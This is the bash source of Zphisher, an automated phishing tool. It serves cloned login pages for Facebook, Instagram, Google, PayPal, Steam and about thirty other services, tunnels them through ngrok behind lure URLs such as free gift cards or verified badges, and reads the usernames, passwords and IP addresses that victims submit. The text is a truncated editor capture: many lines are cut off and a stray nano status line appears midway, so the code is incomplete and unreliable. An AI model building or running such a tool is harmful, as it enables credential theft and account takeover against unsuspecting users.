#!/bin/bash
##   Zphisher 	: 	Automated Phishing Tool
##   Author 	: 	TAHMID RAYAT 
##   Version 	: 	2.1
##   Github 	: 	https://github.com/htr-tech

##   THANKS TO :
##   Aditya Shakya - https://github.com/adi1090x
##   Moises Tapia - https://github.com/MoisesTapia
##   TheLinuxChoice - https://twitter.com/linux_choice
##   DarksecDevelopers  - https://github.com/DarksecDevelopers
##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
##   Võ Ngọc Bảo - https://github.com/vongocbao
##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009


## If you Copy Then Give the credits :)



##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2021  HTR-TECH (https://github.com/htr-tech)
##


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033>
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\>
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '>
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(print>
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
        mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
        rm -rf ".server/www"
        mkdir -p ".server/www"
else
        mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}>
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}>
    exit 0
}
trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
        tput sgr0   # reset attributes
        tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
        if [[ `pidof php` ]]; then
                killall php > /dev/null 2>&1
        fi
        if [[ `pidof ngrok` ]]; then
                killall ngrok > /dev/null 2>&1
        fi
}

## Banner
banner() {
        cat <<- EOF
                ${ORANGE}
                ${ORANGE} ______      _     _    >
                ${ORANGE}|___  /     | |   (_)   >
                ${ORANGE}   / / _ __ | |__  _ ___>
                ${ORANGE}  / / | '_ \| '_ \| / __>
                ${ORANGE} / /__| |_) | | | | \__ >
                ${ORANGE}/_____| .__/|_| |_|_|___>
                ${ORANGE}      | |               >
                ${ORANGE}      |_|               >

                ${GREEN}[${WHITE}-${GREEN}]${CYAN>
        EOF
}
## Small Banner
banner_small() {
        cat <<- EOF
                ${BLUE}
                ${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█>
                ${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█>
                ${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀>
        EOF
                           echo  "Coded by I-T MA>
                          echo "Subscribe on Yout>
}
## Dependencies
dependencies() {
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${C>

    if [[ -d "/data/data/com.termux/files/home" ]>
        if [[ `command -v proot` ]]; then
            printf ''
        else
                        echo -e "\n${GREEN}[${WHI>
            pkg install proot resolv-conf -y
        fi
    fi

        if [[ `command -v php` && `command -v wge>
                echo -e "\n${GREEN}[${WHITE}+${GR>
        else
                pkgs=(php curl wget unzip)
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/nul>
                                echo -e "\n${GREE>
                                if [[ `command -v>
                                        pkg insta>
                                elif [[ `command >
                                        apt insta>
                                elif [[ `command >
                                        apt-get i>
                                elif [[ `command >
                                        sudo pacm>
                                elif [[ `command >
                                        sudo dnf >
                                else
                                        echo -e ">
                                        { reset_c>
                                fi
                        }
   done
        fi

}

## Download Ngrok
download_ngrok() {
        url="$1"
        file=`basename $url`
        if [[ -e "$file" ]]; then
                rm -rf "$file"
        fi
        wget --no-check-certificate "$url" > /dev>
        if [[ -e "$file" ]]; then
                unzip "$file" > /dev/null 2>&1
                mv -f ngrok .server/ngrok > /dev/>
                rm -rf "$file" > /dev/null 2>&1
                chmod +x .server/ngrok > /dev/nul>
        else
                echo -e "\n${RED}[${WHITE}!${RED}>
                { reset_color; exit 1; }
        fi
}
 ## Install ngrok
install_ngrok() {
        if [[ -e ".server/ngrok" ]]; then
                echo -e "\n${GREEN}[${WHITE}+${GR>
        else
                echo -e "\n${GREEN}[${WHITE}+${GR>
                arch=`uname -m`
                if [[ ("$arch" == *'arm'*) || ("$>
                        download_ngrok 'https://b>
                elif [[ "$arch" == *'aarch64'* ]]>
                        download_ngrok 'https://b>
                elif [[ "$arch" == *'x86_64'* ]];>
                        download_ngrok 'https://b>
                else
                        download_ngrok 'https://b>
                fi
        fi

}

## Exit message
msg_exit() {
        { clear; banner; echo; }
        echo -e "${GREENBG}${BLACK} Thank you for>
        { reset_color; exit 0; }
}
  ## About
about() {
        { clear; banner; echo; }
        cat <<- EOF
                ${GREEN}Author   ${RED}:  ${ORANG>
                ${GREEN}Github   ${RED}:  ${CYAN}>
                ${GREEN}Social   ${RED}:  ${CYAN}>
                ${GREEN}Version  ${RED}:  ${ORANG>

                ${REDBG}${WHITE} Thanks : Adi1090>
                                                 >

                ${RED}[${WHITE}00${RED}]${ORANGE}>

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} >

        if [[ "$REPLY" == 99 ]]; then
                msg_exit
        elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]>
                echo -ne "\n${GREEN}[${WHITE}+${G>
                { sleep 1; main_menu; }
        else
                echo -ne "\n${RED}[${WHITE}!${RED>
                { sleep 1; about; }
        fi
}
   ## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE}>
        cp -rf .sites/"$website"/* .server/www
        cp -f .sites/ip.php .server/www/
        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE>
        cd .server/www && php -S "$HOST":"$PORT" >
}

## Get IP address
capture_ip() {
        IP=$(grep -a 'IP:' .server/www/ip.txt | c>
        IFS=$'\n'
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN>
        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE>
        cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
        ACCOUNT=$(grep -o 'Username:.*' .server/w>
        PASSWORD=$(grep -o 'Pass:.*' .server/www/>
        IFS=$'\n'
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN>
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN>
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE}>
        cat .server/www/usernames.txt >> username>
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORAN>
                
     cat .server/www/usernames.txt >> username>
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORAN>
}

## Print data
capture_data() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORAN>
        while true; do
                if [[ -e ".server/www/ip.txt" ]];>
                        echo -e "\n\n${RED}[${WHI>
                        capture_ip
                        rm -rf .server/www/ip.txt
                fi
                sleep 0.75
                if [[ -e ".server/www/usernames.t>
                        echo -e "\n\n${RED}[${WHI>
                        capture_creds
                        rm -rf .server/www/userna>
                fi
                sleep 0.75
        done
}
   ## Start ngrok
start_ngrok() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN    >
        { sleep 1; setup_site; }
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GR    >

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok     >
    else
        sleep 2 && ./.server/ngrok http "$HOST":"    >
    fi

        { sleep 8; clear; banner_small; }
        ngrok_url=$(curl -s -N http://127.0.0.1:4    >
        ngrok_url1=${ngrok_url#https://}
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE}    >
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE}    >
        capture_data
}

## Start localhost
start_localhost() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN    >
        setup_site
        { sleep 1; clear; banner_small; }
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN    >
        capture_data
}
    ## Tunnel selection
tunnel_menu() {
        { clear; banner_small; }
        cat <<- EOF

                ${RED}[${WHITE}01${RED}]${ORANGE} Loc>
                ${RED}[${WHITE}02${RED}]${ORANGE} Ngr>

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Sele>

        if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
                start_localhost
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; t>
                start_ngrok
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${>
                { sleep 1; tunnel_menu; }
        fi
}
    ## Facebook
site_facebook() {
        cat <<- EOF

                ${RED}[${WHITE}01${RED}]${ORANGE} Tra>
                ${RED}[${WHITE}02${RED}]${ORANGE} Adv>
                ${RED}[${WHITE}03${RED}]${ORANGE} Fak>
                ${RED}[${WHITE}04${RED}]${ORANGE} Fac>

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Sele>

        if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
                website="facebook"
                mask='http://blue-verified-badge-for->
                tunnel_menu
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; t>
                website="fb_advanced"
                mask='http://vote-for-the-best-social>
                tunnel_menu
        elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; t>
                website="fb_security"
                mask='http://make-your-facebook-secur>
                tunnel_menu
        elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; t>
                website="fb_messenger"
                mask='http://get-messenger-premium-fe>
                tunnel_menu
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${>
                { sleep 1; clear; banner_small; site_>
        fi
}
## Instagram
site_instagram() {
        cat <<- EOF

                ${RED}[${WHITE}01${RED}]${ORANGE} Tra>
                ${RED}[${WHITE}02${RED}]${ORANGE} Aut>
                ${RED}[${WHITE}03${RED}]${ORANGE} 100>
                ${RED}[${WHITE}04${RED}]${ORANGE} Blu>

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Sele>

        if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
                website="instagram"
                mask='http://get-unlimited-followers->
                tunnel_menu
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; t>
                website="ig_followers"
                mask='http://get-unlimited-followers->
                tunnel_menu
        elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; t>
                website="insta_followers"
                mask='http://get-1000-followers-for-i>
                tunnel_menu
        elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; t>
                website="ig_verify"
                mask='http://blue-badge-verify-for-in>
                tunnel_menu
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${>
                { sleep 1; clear; banner_small; site_>
        fi
}
## Gmail/Google
site_gmail() {
        cat <<- EOF

                ${RED}[${WHITE}01${RED}]${ORANGE} Gma>
                ${RED}[${WHITE}02${RED}]${ORANGE} Gma>
                ${RED}[${WHITE}03${RED}]${ORANGE} Adv>

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Sele>

        if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
                website="google"
                mask='http://get-unlimited-google-dri>
                tunnel_menu
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; t>
                website="google_new"
                mask='http://get-unlimited-google-dri>
                tunnel_menu
        elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; t>
                website="google_poll"
                mask='http://vote-for-the-best-social>
                tunnel_menu
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${>
                { sleep 1; clear; banner_small; site_>
        fi
}
GNU nano 5.7         zphisher.sh          Modified
## Vk
site_vk() {
        cat <<- EOF

                ${RED}[${WHITE}01${RED}]${ORANGE} Tra>
                ${RED}[${WHITE}02${RED}]${ORANGE} Adv>

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Sele>

        if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
                website="vk"
                mask='http://vk-premium-real-method-2>
                tunnel_menu
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; t>
                website="vk_poll"
                mask='http://vote-for-the-best-social>
                tunnel_menu
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${>
                { sleep 1; clear; banner_small; site_>
        fi
}
## Menu
main_menu() {
        { clear; banner; echo; }
        cat <<- EOF
                ${RED}[${WHITE}::${RED}]${ORANGE} Sel     >

                ${RED}[${WHITE}01${RED}]${ORANGE} Fac     >
                ${RED}[${WHITE}02${RED}]${ORANGE} Ins     >
                ${RED}[${WHITE}03${RED}]${ORANGE} Goo     >
                ${RED}[${WHITE}04${RED}]${ORANGE} Mic     >
                ${RED}[${WHITE}05${RED}]${ORANGE} Net     >
                ${RED}[${WHITE}06${RED}]${ORANGE} Pay     >
                ${RED}[${WHITE}07${RED}]${ORANGE} Ste     >
                ${RED}[${WHITE}08${RED}]${ORANGE} Twi     >
                ${RED}[${WHITE}09${RED}]${ORANGE} Pla     >
                ${RED}[${WHITE}10${RED}]${ORANGE} Tik     >
                ${RED}[${WHITE}31${RED}]${ORANGE} Med     >

                ${RED}[${WHITE}99${RED}]${ORANGE} Abo     >

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Sele     >

        if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
                site_facebook
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; t     >
                site_instagram
        elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; t     >
                site_gmail
        elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; t     >
                website="microsoft"
                mask='http://unlimited-onedrive-space     >
                tunnel_menu
        elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; t     >
                website="netflix"
                mask='http://upgrade-your-netflix-pla     >
                tunnel_menu
        elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; t     >
                website="paypal"
                mask='http://get-500-usd-free-to-your     >
                tunnel_menu
        elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; t     >
                website="steam"
                mask='http://steam-500-usd-gift-card-     >
                tunnel_menu
    elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
                website="twitter"
                mask='http://get-blue-badge-on-twitter-fre>
                tunnel_menu
        elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
                website="playstation"
                mask='http://playstation-500-usd-gift-card>
                tunnel_menu
        elif [[ "$REPLY" == 10 ]]; then
                website="tiktok"
                mask='http://tiktok-free-liker'
                tunnel_menu
        elif [[ "$REPLY" == 11 ]]; then
                website="twitch"
                mask='http://unlimited-twitch-tv-user-for->
                tunnel_menu
        elif [[ "$REPLY" == 12 ]]; then
                website="pinterest"
                mask='http://get-a-premium-plan-for-pinter>
                tunnel_menu
        elif [[ "$REPLY" == 13 ]]; then
                website="snapchat"
                mask='http://view-locked-snapchat-accounts>
                tunnel_menu
        elif [[ "$REPLY" == 14 ]]; then
                website="linkedin"
                mask='http://get-a-premium-plan-for-linked>
                tunnel_menu
        elif [[ "$REPLY" == 15 ]]; then
                website="ebay"
                mask='http://get-500-usd-free-to-your-acou>
                tunnel_menu
        elif [[ "$REPLY" == 16 ]]; then
                website="quora"
                mask='http://quora-premium-for-free'
                tunnel_menu
        elif [[ "$REPLY" == 17 ]]; then
                website="protonmail"
                mask='http://protonmail-pro-basics-for-fre>
                tunnel_menu
     elif [[ "$REPLY" == 17 ]]; then
                website="protonmail"
                mask='http://protonmail-pro-basics-for-fre>
                tunnel_menu
        elif [[ "$REPLY" == 18 ]]; then
                website="spotify"
                mask='http://convert-your-account-to-spoti>
                tunnel_menu
        elif [[ "$REPLY" == 19 ]]; then
                website="reddit"
                mask='http://reddit-official-verified-memb>
                tunnel_menu
        elif [[ "$REPLY" == 20 ]]; then
                website="adobe"
                mask='http://get-adobe-lifetime-pro-member>
                tunnel_menu
        elif [[ "$REPLY" == 21 ]]; then
                website="deviantart"
                mask='http://get-500-usd-free-to-your-acou>
                tunnel_menu
        elif [[ "$REPLY" == 22 ]]; then
                website="badoo"
                mask='http://get-500-usd-free-to-your-acou>
                tunnel_menu
        elif [[ "$REPLY" == 23 ]]; then
                website="origin"
                mask='http://get-500-usd-free-to-your-acou>
                tunnel_menu
        elif [[ "$REPLY" == 24 ]]; then
                website="dropbox"
                mask='http://get-1TB-cloud-storage-free'
                tunnel_menu
        elif [[ "$REPLY" == 25 ]]; then
                website="yahoo"
                mask='http://grab-mail-from-anyother-yahoo>
                tunnel_menu
        elif [[ "$REPLY" == 26 ]]; then
                website="wordpress"
                mask='http://unlimited-wordpress-traffic-f>
                tunnel_menu
        elif [[ "$REPLY" == 27 ]]; then
                website="yandex"
                mask='http://grab-mail-from-anyother-yande>
                tunnel_menu
                  elif [[ "$REPLY" == 28 ]]; then
                website="stackoverflow"
                mask='http://get-stackoverflow-lifetime-pr>
                tunnel_menu
        elif [[ "$REPLY" == 29 ]]; then
                site_vk
        elif [[ "$REPLY" == 30 ]]; then
                website="xbox"
                mask='http://get-500-usd-free-to-your-acou>
                tunnel_menu
        elif [[ "$REPLY" == 31 ]]; then
                website="mediafire"
                mask='http://get-1TB-on-mediafire-free'
                tunnel_menu
        elif [[ "$REPLY" == 32 ]]; then
                website="gitlab"
                mask='http://get-1k-followers-on-gitlab-fr>
                tunnel_menu
        elif [[ "$REPLY" == 33 ]]; then
                website="github"
                mask='http://get-1k-followers-on-github-fr>
                tunnel_menu
        elif [[ "$REPLY" == 99 ]]; then
                about
        elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
                msg_exit
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} >
                { sleep 1; main_menu; }
        fi
}

## Main
kill_pid
dependencies
install_ngrok
main_menu                  
